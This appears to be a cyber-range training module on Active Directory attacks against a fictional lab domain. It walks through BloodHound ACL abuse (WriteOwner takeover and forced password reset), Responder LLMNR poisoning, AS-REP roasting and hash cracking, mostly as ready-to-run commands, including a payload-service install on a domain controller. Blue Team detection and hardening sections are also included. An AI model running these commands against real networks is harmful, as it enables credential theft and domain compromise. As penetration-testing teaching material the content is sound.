docs.title: Edge to Tooling, at a Glance
docs.text:
The flowchart below is the decision you make for any path BloodHound hands you, not just this one. Match the edge label to the tool family.

flowchart TD
    Edge["BloodHound edge label"]
    Edge --> M{Edge type?}
    M -- "MemberOf" --> A["passive: confirm with<br/>net rpc group members"]
    M -- "AdminTo" --> B["psexec.py / wmiexec.py /<br/>evil-winrm"]
    M -- "GenericAll / GenericWrite" --> C["bloodyAD set / add<br/>or PowerView Add-DomainObjectAcl"]
    M -- "WriteOwner" --> D["bloodyAD set owner ->><br/>add genericAll ->><br/>force-change-pw"]
    M -- "WriteDACL" --> E["dacledit.py write<br/>(impacket)"]
    M -- "ForceChangePassword" --> F["net rpc password<br/>or bloodyAD set password"]
    M -- "AddMember" --> G["net rpc group addmem<br/>or bloodyAD add member"]
    M -- "AllowedToDelegate" --> H["impacket getST.py<br/>S4U2self/S4U2proxy"]
    M -- "AllowedToAct (RBCD)" --> I["impacket getST.py<br/>after rbcd.py write"]

docs.title: Background: Edges, Tradecraft, and Why the Two Are Different
docs.text: BloodHound shows you a graph of who can do what. Each edge type maps to a different attack technique with its own tooling, side effects, and detection profile. Knowing which edge is in the path is the easy part; knowing which command turns that edge into compromise is the harder part.

docs.title: A taxonomy of common attacking edges
docs.text:
Edge What it grants How an attacker uses it MemberOf Source belongs to target group; inherits its rights Passive. No action needed; the source already has whatever the target group grants. AdminTo Source is local admin on target computer psexec.py user@host, wmiexec.py, evil-winrm, etc. Use any admin-only protocol. CanRDP Source can RDP to target computer xfreerdp /u:user /p:pass /v:host. Useful as a foothold for further pivoting. GenericAll Source has full control on target net rpc password to reset, or bloodyAD set-attribute to set any attribute. GenericWrite Source can write any property on target Add SPN to user object (now Kerberoastable), set userAccountControl flags, set msDS-AllowedToDelegateTo. WriteDACL Source can change target's ACL dacledit.py write to add a new ACE granting yourself further rights. WriteOwner Source can take ownership of target Set-DomainObjectOwner (PowerView) or bloodyAD set-owner, then add yourself a GenericAll ACE, then ForceChangePassword. ForceChangePassword Source can reset the target user's password without knowing the old net rpc password "user" "newpass" -U "src%pass" -S dc. AddMember Source can add members to the target group net rpc group addmem "target_group" "yourself" -U .... AllowedToDelegate Source is configured for constrained delegation to target service getST.py -spn target -impersonate Administrator <user>. AllowedToAct Source is in target computer's RBCD list getST.py -spn cifs/target.fqdn -impersonate Administrator <controlled_account>. HasSession Source user has an active session on target computer Compromise the computer to extract the source user's credential from memory.

The pattern: every edge tells you the right tool for that step. Mismatch the tool and you waste the path.

docs.title: Why WriteOwner needs three commands
docs.text:
WriteOwner only grants you the ability to take ownership of the target object. Owning it does not by itself let you do anything; you have to add yourself an ACE that grants further rights. The full sequence:

  1. Set-DomainObjectOwner -Identity m.tanaka -OwnerIdentity j.chen (PowerView); now you own the object.
  2. Add-DomainObjectAcl -TargetIdentity m.tanaka -PrincipalIdentity j.chen -Rights All; now you have GenericAll on the object.
  3. net rpc password "m.tanaka" "<new>" -U "CORP\j.chen%Welcome2026#" -S corp-dc01; now you have reset the password.

Many graphs render WriteOwner followed by a second edge Owns, then GenericAll from the owner. BloodHound CE collapses this into a single WriteOwner arrow; you must mentally expand it into the three commands. The scorer for this exercise treats the chain as a single edge labelled WriteOwner.

docs.title: bloodhound-python collection
docs.text:
bloodhound-python -u j.chen -p 'Welcome2026#' \
  -d corp.nordport.local -ns <DC_IP> \
  -c All --zip

docs.title: BloodHound CE Cypher: shortest path to Server Operators
docs.text:
MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE n.name = 'J.CHEN@CORP.NORDPORT.LOCAL' AND m.name = 'SERVER OPERATORS@CORP.NORDPORT.LOCAL' RETURN p

Canonical BHCE form per the official docs: one MATCH, one WHERE with AND-joined predicates, RETURN p for the graph view. Keep the entire query on one logical line; pasted line wraps inside the string literals break the comparison.

The result graph shows the four edges.

docs.title: PowerView WriteOwner traversal
docs.text:
# Step 1: take ownership
Set-DomainObjectOwner -Identity m.tanaka -OwnerIdentity j.chen

# Step 2: grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity m.tanaka -PrincipalIdentity j.chen -Rights All

docs.title: bloodyAD WriteOwner traversal (Linux-native)
docs.text:
bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  set owner m.tanaka j.chen

bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  add genericAll m.tanaka j.chen

docs.title: Force password change
docs.text:
net rpc password "m.tanaka" "NewPass2026#" \
  -U "CORP\j.chen%Welcome2026#" -S corp-dc01

docs.title: Step 1: Collect
docs.text:
Before any path-finding you need a fresh data set in BloodHound CE. bloodhound-python is the Linux-native collector that walks LDAP, SAMR, and SMB to produce the JSON files BloodHound ingests. The collection method All covers every supported data type; the smaller methods (Group, LocalAdmin, Session) are for repeat collections after the first full one.

Kali - Run bloodhound-python and ingest

mkdir -p ~/work/adpt-2-04 && cd ~/work/adpt-2-04
bloodhound-python -u j.chen -p 'Welcome2026#' \
  -d corp.nordport.local -ns <DC_IP> -c All --zip
Flag Effect -u, -p, -d Username, password, domain. -ns <DC_IP> Name server to use for SRV/A lookups. Use the literal DC IP (e.g. 10.100.2.10); a hostname here only works if your /etc/resolv.conf already points at the DC, which the standard Kali RangeBox does not. -c All Collect every data type: ACLs, sessions, groups, trusts, GPOs, certificates. --zip Bundle the JSON output into one timestamped zip ready for ingest.

Output is a file like 20260425103015_bloodhound.zip. Open BloodHound CE, click the upload icon, and drop the zip in. Ingest takes 30 to 90 seconds.

docs.title: Step 2: Find the Path
docs.text:
The BloodHound UI offers a built-in shortest-path button, but the Cypher query in the Tool Primer above is more reproducible (you can paste it into a report). Either way, you are asking the graph database for a directional path from your foothold node to a target node, capped at 15 hops to keep the search tractable.

In the BloodHound search bar, type j.chen and select her node. From her node, right-click and select Shortest Paths, then set the target to Server Operators. Or paste the Cypher from the Tool Primer into the Run Raw Query box.

You should see four edges connecting J.CHEN -> IT_HELPDESK -> M.TANAKA -> SERVER OPERATORS. The middle edge will be WriteOwner. BloodHound also shows the implicit ForceChangePassword capability that GenericAll enables once you take ownership; the platform draws it as a separate edge for clarity.

docs.title: Step 3: Name the Edges
docs.text:
Reading edges off the graph is a discipline: edge labels are precise vocabulary, and if you call WriteOwner "WriteDACL" in your report you tell the defender to look in the wrong place. Build the table below by hovering each arrow in the BloodHound UI; the tooltip shows the canonical label.

Step From Edge To 1 j.chen MemberOf IT_HelpDesk 2 IT_HelpDesk WriteOwner m.tanaka 3 m.tanaka ForceChangePassword (via GenericAll after taking ownership) m.tanaka 4 m.tanaka MemberOf Server Operators

docs.title: Step 4: Write the Plan
docs.text:
The plan you submit should be commands, not narrative. Example:

1. MemberOf (j.chen -> IT_HelpDesk):
   Already a member; no action required. Confirm with:
     net rpc group members "IT_HelpDesk" -U "CORP\j.chen%Welcome2026#" -S corp-dc01

2. WriteOwner (IT_HelpDesk -> m.tanaka):
   Take ownership and grant ourselves GenericAll on m.tanaka:
     bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
       set owner m.tanaka j.chen
     bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
       add genericAll m.tanaka j.chen

3. ForceChangePassword (m.tanaka -> m.tanaka):
   Reset m.tanaka's password to a value we control:
     net rpc password "m.tanaka" "TempReset2026#" \
       -U "CORP\j.chen%Welcome2026#" -S corp-dc01

4. MemberOf (m.tanaka -> Server Operators):
   Authenticate as m.tanaka with the new password; she inherits Server Operators rights:
     netexec smb corp-dc01 -u m.tanaka -p 'TempReset2026#' --local-auth=False
   With Server Operators rights we can manipulate domain services for further escalation.

docs.title: Step 5: Submit to the Scorer
docs.text:
A small HTTP service inside the lab subnet validates plans. It accepts a JSON body listing the four edge types and the four target node names; if both arrays match the expected sequence the service returns the flag. The point of the JSON gate is to force you to identify edges correctly rather than describe them in handwavy prose.

The scorer URL is shown in the Active Lab View on scorer.adpt.local:8080.

Kali - Submit the plan

cat > /tmp/adpt-2-04-plan.json <<'EOF'
{
  "edges": ["MemberOf", "WriteOwner", "ForceChangePassword", "MemberOf"],
  "targets": ["IT_HelpDesk", "m.tanaka", "m.tanaka", "Server Operators"]
}
EOF

curl -s -X POST -H 'Content-Type: application/json' \
  -d @/tmp/adpt-2-04-plan.json \
  http://scorer.adpt.local:8080/submit
Flag Effect cat > file <<'EOF' ... EOF Heredoc; quoted 'EOF' disables variable expansion (literal JSON). -s Silent mode; no curl progress bar. -X POST HTTP method. -H 'Content-Type: application/json' Required for the scorer's body parser. -d @<file> Read body from file rather than command line.

A correct submission returns {"flag":"OCR{...}"}. An incorrect submission returns which edge(s) were wrong (for example {"errors":[{"index":1,"got":"GenericAll","expected":"WriteOwner"}]}); fix the entry and resubmit.

Submit the flag to the OpenCyberRange platform.

Common gotchas

  • Edge label casing: the scorer matches case-insensitively on edge names (writeowner works) but exactly on target names (m.tanaka not M.Tanaka).
  • GenericAll vs WriteOwner: a freshly seeded path may surface as GenericAll if BloodHound has cached an older collection. Re-collect after Step 1; do not paste the cached graph from a previous chapter.
  • DNS for the scorer: scorer.adpt.local resolves through the DC. If corp-dc01 is not your /etc/resolv.conf's nameserver, replace the hostname with the IP shown in the Active Lab View.
  • PowerView vs bloodyAD execution: PowerView requires a Windows host (run from a beachhead, not Kali). bloodyAD runs natively on Kali. Pick one and stick with it within a single plan.

docs.title: Blue Team Perspective
docs.text:
Each edge traversal leaves its own log signature. A SOC pulling four signals across two minutes from one source IP has a high-confidence ACL-abuse alert.

Step Activity Event ID WriteOwner DACL change on user object 5136 (directory service object modified) WriteOwner Owner SID change 4738 + 4670 (user account changed + permission granted) ForceChangePassword Password reset by another user 4724 (account password reset) MemberOf transition New Server Operators rights exercised 4625 / 4624 burst on DCs

Where SOCs catch this in practice

The single best detection is on event 4724: a user resetting another user's password where the resetter is not on the helpdesk allow-list. Most environments do not detect WriteOwner / WriteDACL writes because they do not enable advanced object-access auditing on every user object. Microsoft Defender for Identity ships a built-in detection ("Suspicious modification of a sensitive group") that fires when the target is in any privileged group.

docs.title: Hardening Note
docs.text:
The lesson of this chapter is that ACL hygiene is the work. Most domains have orphaned ACEs that were granted years ago for a one-off task and never revoked. The list below is the realistic remediation menu.

ACL-path hardening

  • Run BloodHound against your own domain quarterly. Sort paths to Domain Admins and Tier-0 groups by length. Eliminate the shortest paths first.
  • Audit Server Operators, Backup Operators, Print Operators, and Account Operators membership; treat them as Tier-0-equivalent.
  • Build a SIEM detection on event 4724 with allow-list of legitimate password-reset principals.
  • Enable advanced object-access auditing on every user object in Tier-0 OUs (event 5136).
  • Migrate password-reset rights to a least-privilege delegation model: helpdesk staff reset only specific OUs, not all of Domain Users.
  • Archive every BloodHound collection so you can diff this quarter against last quarter and see new edges as they appear.

docs.title: Record Your Findings
docs.text:
Path:

j.chen --MemberOf--> IT_HelpDesk --WriteOwner--> m.tanaka --ForceChangePassword--> m.tanaka --MemberOf--> Server Operators

Plan:

1. ...
2. ...
3. ...
4. ...

Flag:

(OCR{...})

docs.title: Analysis Questions
docs.text:
1. The WriteOwner edge requires three commands to traverse, while ForceChangePassword requires one. Why does BloodHound represent both as a single edge?

Reveal Answer

BloodHound models edges by the underlying right that makes the chain possible, not by the count of commands required. WriteOwner is the originating right; once you have it, the rest of the chain (take ownership, grant yourself GenericAll, then exercise GenericAll however you like) is determined. The graph compresses the determinism into a single edge so the path search runs efficiently. The cost is that the edge is misleading to a reader who has not internalized the WriteOwner -> Own -> GenericAll progression. Operators learn to mentally expand each edge during the planning step. In BloodHound's documentation each edge has a "Help" panel describing the underlying technique and the recommended tooling.

2. The seeded path goes through Server Operators rather than Domain Admins. What does Server Operators membership get you, and why is that often more useful than DA?

Reveal Answer

Server Operators is a built-in group that allows members to start, stop, pause, and configure services on Domain Controllers; install and configure printer drivers; format DC hard drives; and shut down DCs. None of those rights look like Domain Admin on paper, but several of them are equivalent in effect. The classic abuse: install a service that runs as LOCAL SYSTEM on a DC, point it at a payload of your choice, start the service. That payload then runs as NT AUTHORITY\SYSTEM on a DC, which means you can secretsdump the DC, dump ntds.dit, or write to lsass. Membership in Server Operators does not show up in audits searching for Domain Admins and rarely triggers alerts. For a defender concerned with privileged-group hygiene, Server Operators is one of the most undermonitored Tier-0-equivalent groups.

3. The four-edge path is short on purpose. What does that reveal about why most AD compromises succeed?

Reveal Answer

Real AD compromises rarely require ten-edge chains. Most successful chains are 2 to 5 edges, often involving a single misconfigured ACL, a single weak service account password, or a single LAPS read delegation. Defenders often imagine attackers as patient adversaries chaining many tiny mistakes; in practice, attackers find one big mistake and walk straight through it. The defensive implication is that identifying and removing your shortest paths is the highest-yield AD hardening activity. Run BloodHound against your own domain quarterly. Sort paths to Domain Admins by length. Eliminate the shortest ones first. Each path you remove forces the next attacker into longer, noisier, more interactive routes.

docs.title: Key Takeaways
docs.text:
• BloodHound shows the route; the human translates each edge into a concrete command.
  • WriteOwner is a three-command sequence: take ownership, grant GenericAll, exercise it.
  • Server Operators is functionally equivalent to Domain Admin via the service-on-DC technique.
  • Real attack paths are typically 2 to 5 edges, not 10. Eliminate your shortest paths first.
  • A submitted plan is more useful than a screenshot; defenders want to see the commands, not the picture.

docs.title: Cheat Sheet Recap
docs.text:
The four operations below traverse the full WriteOwner-to-Server-Operators path. Memorize the order; it appears in every ACL-abuse exercise from here on.

Step Command 1. Take ownership bloodyAD -d <domain> -u <atk> -p '<pw>' --host <dc> set owner <target> <atk> 2. Grant yourself GenericAll bloodyAD -d <domain> -u <atk> -p '<pw>' --host <dc> add genericAll <target> <atk> 3. Force-change password net rpc password "<target>" "<newpw>" -U "<DOMAIN>\<atk>%<pw>" -S <dc> 4. Validate as target netexec smb <dc> -u <target> -p '<newpw>' -d <domain>

docs.title: Spaced Repetition
docs.text:
Card 1: WriteOwner Three-Command Sequence

Q: List the three commands (in order) that traverse a WriteOwner edge from attacker to target, ending in a working password reset.

Answer
  1. Set-DomainObjectOwner -Identity target -OwnerIdentity attacker (PowerView) or bloodyAD set owner target attacker. 2. Add-DomainObjectAcl -TargetIdentity target -PrincipalIdentity attacker -Rights All (PowerView) or bloodyAD add genericAll target attacker. 3. net rpc password "target" "<newpass>" -U "DOM\attacker%pass" -S <dc>. Step 1 sets ownership, step 2 grants you GenericAll because the owner can always set permissions, step 3 exercises GenericAll to reset the password.

Card 2: Server Operators Privilege

Q: Name the canonical attack that turns Server Operators membership into Domain Admin equivalence.

Answer

Install a Windows service on a Domain Controller that runs as LOCAL SYSTEM with the payload of your choice (sc.exe create EvilSvc binPath= "C:\path\to\payload.exe" type= own start= demand), then start it (sc.exe start EvilSvc). The payload runs as NT AUTHORITY\SYSTEM on the DC, which can secretsdump the DC, write to LSASS, or perform any Tier-0 action.

Card 3: ForceChangePassword in One Line

Q: Write the net rpc command to reset m.tanaka's password to Temp2026# using j.chen / Pass# against corp-dc01.

Answer 
net rpc password "m.tanaka" "Temp2026#" \
  -U "CORP\j.chen%Pass#" -S corp-dc01

Equivalent on Linux with bloodyAD: bloodyAD -d corp.nordport.local -u j.chen -p 'Pass#' --host corp-dc01 set password m.tanaka 'Temp2026#'.

Card 4: BloodHound Cypher for Shortest Path

Q: Write the Cypher query for the shortest path from j.smith@corp.local to the Server Operators group at corp.local.

Answer 
MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE n.name = 'J.SMITH@CORP.LOCAL' AND m.name = 'SERVER OPERATORS@CORP.LOCAL' RETURN p

Canonical BHCE form: single MATCH, single WHERE with AND, RETURN p so the graph view renders. All names UPPERCASE with @DOMAIN.TLD suffix. [*1..] is unbounded - BHCE's planner handles it efficiently for shortestPath.

Card 5: Why Plans Beat Screenshots

Q: Why is a numbered execution plan a better deliverable than a BloodHound screenshot when reporting a finding?

Answer

A screenshot tells the reader an attack path exists. A numbered plan tells them what an attacker would do next, which lets them prioritize remediation by effort vs payoff. Defenders can also feed a plan into change management ("if we remove the WriteOwner ACE, step 2 fails and the chain breaks") whereas they cannot do that with a graph. Plans also pull the consultant out of the implicit assumption that "everyone knows what WriteOwner means"; many client-side readers do not, and a plan with the actual commands carries the explanation.

docs.title: Before You Begin
docs.text:
LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) are the protocols Windows falls back to when DNS does not resolve a name. A workstation that types \\filesharee (note the typo) into Explorer will: ask DNS, fail, broadcast WHO IS filesharee? over LLMNR/NBT-NS, and authenticate to whoever answers. An attacker on the same broadcast segment running Responder answers, and the workstation hands over a Net-NTLMv2 challenge-response that the attacker can crack offline.

LLMNR/NBT-NS poisoning is the single most common credential-capture technique in modern internal pentests. Defenders disable LLMNR and NBT-NS via Group Policy. Most don't.

Tools required: responder, hashcat, john (alternative cracker), pre-installed on Kali.

docs.title: Scenario
docs.text:
Marcus Bell: "LLMNR is the protocol that asks the network 'does anyone know who SHARED-DRIVE is?' If nobody answers, an attacker on the segment can. The Nordport workstation VLAN has a half-broken file server pointer that users mistype every day. Catch one with Responder, crack the hash, and the recovered password is your flag."

Your scope token is exposed as OCR_SCOPE_TOKEN. The simulated user on the segment is n.morton_<token>; whatever password you crack from their hash is the literal flag string you submit.

Credentials:

Username Password j.chen Welcome2026#

(You will not actually use j.chen for the attack; it's only there as your starting foothold.)

docs.title: Your Objectives
docs.text:
• Run Responder on your Kali interface attached to the lab segment
  • Wait for the simulated victim to broadcast a mistyped lookup
  • Capture the Net-NTLMv2 hash for n.morton_<token>
  • Crack the hash with rockyou.txt + best64
  • Submit the recovered plaintext as the flag

docs.title: LLMNR Poisoning at Wire Level
docs.text:
Five packets and a wordlist crack are the entire technique. The diagram below mirrors the conversation a packet capture would show.

sequenceDiagram
    autonumber
    participant V as Victim (n.morton)
    participant DNS as Domain DNS
    participant R as Responder (Kali)
    participant LAN as Local Link

    V->>DNS: A? "filesharee"
    DNS-->>V: NXDOMAIN
    V->>LAN: LLMNR multicast UDP/5355<br/>"WHO IS filesharee?"
    R-->>V: LLMNR response<br/>"filesharee = <kali_ip>"
    V->>R: SMB connect (TCP/445)
    R-->>V: NTLM challenge (1122334455667788)
    V->>R: NTLM authenticate<br/>(Net-NTLMv2 = HMAC of NT_hash + challenge)
    Note over R: Hash logged to<br/>/usr/share/responder/logs/<br/>SMB-NTLMv2-SSP-<ip>.txt

docs.title: Capture-and-Crack vs Relay
docs.text:
Two paths come out of a captured authentication. The flowchart below is the decision a senior operator makes within a few seconds of seeing the first hash hit.

flowchart TD
    H["Net-NTLMv2 captured for <user>"]
    Q1{"Does <user> have rights<br/>on a relay target?<br/>(SMB/LDAP/HTTP)"}
    Q2{"Target requires<br/>SMB signing?"}
    R["ntlmrelayx.py<br/>(no crack needed)"]
    C["hashcat -m 5600<br/>rockyou + best64"]
    P["Plaintext password<br/>reusable everywhere"]

    H --> Q1
    Q1 -- "no" --> C --> P
    Q1 -- "yes" --> Q2
    Q2 -- "no" --> R
    Q2 -- "yes" --> C

docs.title: Background: The LLMNR/NBT-NS Fallback Chain
docs.text:
Windows name resolution is layered. Each layer is tried in order, and any answer wins. The default chain on a domain-joined workstation:

  1. HOSTS file -- C:\Windows\System32\drivers\etc\hosts
  2. DNS; the configured DNS server (the DC, in a domain environment)
  3. LLMNR; multicast UDP/5355 on the local link
  4. NBT-NS; broadcast UDP/137 on the local subnet

Only DNS is centrally controlled. LLMNR and NBT-NS rely on the link layer: anyone on the same subnet (NBT-NS) or local link (LLMNR) can answer. There is no authentication; the first answer wins.

docs.title: What happens when a user mistypes
docs.text:
User opens File Explorer and types \\filesharee\Public (extra e). Explorer asks the resolver for filesharee. DNS does not have a record (no such host). Explorer falls back:

LLMNR multicast (UDP 5355) -> ANY: who is "filesharee"?
NBT-NS broadcast (UDP 137) -> ANY: who is "FILESHAREE"?

Responder, running on an attacker's machine on the same segment, replies:

LLMNR/NBT-NS reply -> "filesharee is at <attacker_ip>"

The Windows SMB client connects to <attacker_ip>. The first packets establish the SMB session, including an NTLM challenge-response authentication. The user's credentials are sent in the form of a Net-NTLMv2 hash:

n.morton::CORP:<server_challenge>:<HMAC_response>:<NTLMv2 client blob>

That hash is crackable offline against rockyou.txt (or any wordlist) with hashcat mode 5600. If the password is weak, you have it within minutes.

docs.title: What Responder does
docs.text:
Responder runs three things in parallel: 1. Poisoners: LLMNR, NBT-NS, mDNS replies pointing at attacker IP 2. Servers: SMB, HTTP, FTP, IMAP, POP3, MSSQL, LDAP, DNS, AUTH listeners that accept the inbound auth and log the captured hashes 3. Logging: per-protocol logs in /usr/share/responder/logs/

By default Responder writes captured hashes to /usr/share/responder/logs/Responder-Session.log and per-protocol files like SMB-NTLMv2-SSP-<src_ip>.txt.

docs.title: Responder basic invocation
docs.text:
sudo responder -I <interface> -wrf
Flag Effect -I <iface> interface to listen on (typically eth0 in the lab) -w start the rogue WPAD proxy server -r enable answers for NBT-NS NB queries on the wire -f fingerprint OS of host querying

Optional but useful: - -A analyze mode; listen but do not poison (useful for observation) - -d enable DHCP poisoning - -v verbose

docs.title: Responder configuration toggles
docs.text:
/etc/responder/Responder.conf has switches: - SMB = On/Off - HTTP = On/Off - Challenge = 1122334455667788; fixed challenge for hash cracking compatibility

The default challenge is fine. The default servers are fine. Change them only when you need to disable a service that conflicts with another local listener.

docs.title: Net-NTLMv2 hash format
docs.text:
n.morton::CORP:1122334455667788:8a4b...:01010000000000...

Five colon-separated fields: 1. Username 2. (empty; legacy field for domain in NTLMv1) 3. Domain (NetBIOS) 4. Server challenge (fixed 8 bytes) 5. HMAC-MD5 response 6. NTLMv2 client blob

The first colon-separated chunk on either side of :: is username::domain; that's how you visually identify a Net-NTLMv2 hash on disk.

docs.title: hashcat mode 5600
docs.text:
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

-m 5600 is the Net-NTLMv2 mode. best64.rule is the canonical "small ruleset that covers most password mutations" file. For tougher hashes, escalate to -r rockyou-30000.rule or -a 3 ?u?l?l?l?l?l?d?d (mask attack).

docs.title: Step 1: Identify Your Interface
docs.text:
Responder must bind to the interface attached to the victim's broadcast domain. Bind to the wrong interface (for example a separate management VLAN) and your poisoners send replies onto a segment with no listeners. List the interfaces and pick the one with a lab-subnet IP.

Kali - Find your lab interface

ip -4 addr show | grep -E '^[0-9]+:|inet '
Token Effect ip -4 addr show List all interfaces with their IPv4 configuration. grep -E '^[0-9]+:\|inet ' Show only interface header lines and inet (IPv4) lines; suppress link/MAC details.

The lab interface is the one with the lab-subnet address (typically 10.100.x.y). Note the name; common values are eth0, ens33, enp0s3. Use whatever your distribution shows.

docs.title: Step 2: Confirm the Victim Host Is Reachable
docs.text:
If you cannot reach the victim's NBT-NS port directly, your poisoning may still work over LLMNR multicast, but it is worth a 5-second sanity probe to confirm you are on the right segment. NetBIOS-over-TCP (TCP 139) is the easiest single-port test.

Kali - Probe the victim host

nc -w 5 <victim_ip> 139 </dev/null && echo "NBT-NS port open"
Token Effect -w 5 Five-second connection timeout; do not hang on a dead host. `

docs.title: Before You Begin
docs.text:
Pre-authentication is the timestamp the client encrypts with its password-derived key inside an AS-REQ. The KDC verifies the timestamp before issuing an AS-REP. The check stops an attacker from blind-fetching crackable AS-REPs for arbitrary users. Disable pre-auth on a user (the DONT_REQ_PREAUTH flag in userAccountControl) and the KDC happily issues AS-REPs without any check; the encrypted enc-part is then crackable offline because it is encrypted with a derivation of the user's password.

Exercise 3.2 asks you to find one such user in Nordport's directory and crack their AS-REP. The recovered password is your flag.

Tools required: impacket-GetNPUsers (often GetNPUsers.py), hashcat, ldapsearch. All pre-installed on Kali.

docs.title: Scenario
docs.text:
Marcus Bell: "Pre-auth is on by default. When it is off, the KDC will hand out an encrypted blob to anyone who asks. Engineering has a service account from 2019 that still has it disabled. The blob is encrypted with the account's key. If the password is weak, you crack it offline."

The target account is svc_legacy_<token>. The password you crack is the flag.

Credentials:

Username Password Use j.chen Welcome2026# LDAP enumeration only (the AS-REP attack itself is unauthenticated)

Domain: corp.nordport.local

docs.title: Your Objectives
docs.text:
• Find every user with DONT_REQ_PREAUTH set
  • Identify your scope-token account
  • Request its AS-REP without authentication
  • Crack the AS-REP with hashcat mode 18200
  • Submit the recovered plaintext

docs.title: Normal AS Exchange vs ASREPRoast
docs.text:
The diagram contrasts the two flows side by side. The only difference is one missing field in the AS-REQ; the consequence is a crackable hash you can ask for unauthenticated.

sequenceDiagram
    autonumber
    participant C as Attacker (Kali)
    participant K as KDC (corp-dc01)

    Note over C,K: Normal user (preauth required)
    C->>K: AS-REQ for victim<br/>(no pA-ENC-TIMESTAMP)
    K-->>C: KRB-ERROR KDC_ERR_PREAUTH_REQUIRED
    Note right of C: cannot proceed unauthenticated

    Note over C,K: ASREPRoast target (DONT_REQ_PREAUTH set)
    C->>K: AS-REQ for svc_legacy<br/>(no pA-ENC-TIMESTAMP)
    K-->>C: AS-REP<br/>enc-part encrypted with user_key
    Note right of C: $krb5asrep$23$user@REALM:...<br/>cracked offline w/ hashcat -m 18200

docs.title: Etype Choice Drives Crack Speed
docs.text:
Three encryption types appear in the wild. The table below tells you which hashcat mode to launch and how aggressively to expect a crack.

Etype Algorithm Hash prefix Hashcat mode Relative crack speed 23 RC4-HMAC $krb5asrep$23$ 18200 fastest (often 2-10x AES) 17 AES128 $krb5asrep$17$ 18201 medium 18 AES256 $krb5asrep$18$ 18202 slowest

docs.title: Background: Why DONT_REQ_PREAUTH Exists and Why It Survives
docs.text:
When Kerberos was added to Windows 2000, some legacy applications and downlevel clients did not implement the timestamp-encrypted pre-authentication step in the AS-REQ. To support those clients, Microsoft kept a per-user flag (DONT_REQ_PREAUTH, 0x400000) in the userAccountControl bitmask that disables the timestamp requirement. The KDC, seeing the flag, returns an AS-REP without checking the timestamp first.

Modern protocols universally support pre-authentication. The flag survives in production because:

  1. A legacy integration once required it and was never re-tested after the integration was deprecated
  2. An operator set it temporarily ("just to get the script working") and forgot to revert
  3. A migration from a 2003-era domain preserved the flag set on accounts that used to need it
  4. A naive scripted account creation routine used a UAC value template that included the flag

Defenders find these accounts with one LDAP query (below). Attackers find them with the same query and add GetNPUsers.py. The audit-side fix is a one-line Set-ADAccountControl; the discoverable-with-one-LDAP-query nature of the flag is why it is so reliably hit on internal pentests.

docs.title: The LDAP filter
docs.text:
(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

Decoding: - objectCategory=person, objectClass=user: limit to user accounts - userAccountControl:1.2.840.113556.1.4.803:=4194304: bitwise AND match (OID 1.2.840.113556.1.4.803) of the UAC field against 0x400000 (decimal 4194304)

The OID is LDAP_MATCHING_RULE_BIT_AND. Every LDAP search against UAC flags uses one of: 1.2.840.113556.1.4.803 (AND) or 1.2.840.113556.1.4.804 (OR).

docs.title: The AS-REP hash format
docs.text:
GetNPUsers.py returns hashes formatted for hashcat:

$krb5asrep$23$svc_legacy_a7f3@CORP.NORDPORT.LOCAL:<server_challenge>$<encrypted_blob>

23 is the encryption type (RC4-HMAC). Hashcat mode is 18200.

docs.title: LDAP query for AS-REP-roastable users
docs.text:
Authenticated:

ldapsearch -x -LLL -H ldap://<dc> \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName

Unauthenticated alternative (if anonymous LDAP is enabled, see Exercise 2.1):

ldapsearch -x -LLL -H ldap://<dc> \
  -b "DC=corp,DC=nordport,DC=local" \
  "(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName

docs.title: GetNPUsers.py
docs.text:
GetNPUsers.py corp.nordport.local/ -no-pass -usersfile users.txt -dc-ip <dc> -outputfile asrep.hash

Or attack a specific user without a list:

GetNPUsers.py corp.nordport.local/svc_legacy_<token> -no-pass -dc-ip <dc>

-no-pass tells impacket to skip the pre-auth attempt. -usersfile is a one-username-per-line file. -outputfile writes the hash directly to a file in hashcat format.

docs.title: hashcat mode 18200
docs.text:
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

docs.title: Step 1: Find AS-REP-roastable Accounts
docs.text:
The first step is discovery. The bitwise LDAP filter compares each user's userAccountControl against 0x400000 (decimal 4194304) and returns only the users with that bit set. Running it as j.chen rather than anonymously is faster (no anonymous-bind handshake) and works regardless of whether the domain allows anonymous LDAP.

Kali - Pull every user with DONT_REQ_PREAUTH

ldapsearch -x -LLL -H ldap://<dc_ip> \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName \
  | grep sAMAccountName
Token Effect (&(...)(...)) LDAP AND of multiple sub-filters. objectCategory=person Restrict to user objects (excludes computers and security groups). objectClass=user Belt-and-suspenders user-class filter. userAccountControl:1.2.840.113556.1.4.803:=4194304 Bitwise-AND match against the UAC field; 4194304 = 0x400000 = DONT_REQ_PREAUTH. sAMAccountName Only return this single attribute; less data over the wire. \| grep sAMAccountName Filter the LDIF output to just the username lines.

Each line shows a candidate. Yours is svc_legacy_<token>. Other students' candidates also appear; ignore them.

docs.title: Step 2: Build a Users File
docs.text:
GetNPUsers.py accepts either a single username on the command line or a list file via -usersfile. Even with one user, the file form is what you would use in the real world (you would feed an enumerated list of every domain user) so we follow the same pattern.

Kali - Save the candidate list

mkdir -p ~/work/adpt-3-02 && cd ~/work/adpt-3-02
echo "svc_legacy_${OCR_SCOPE_TOKEN}" > users.txt

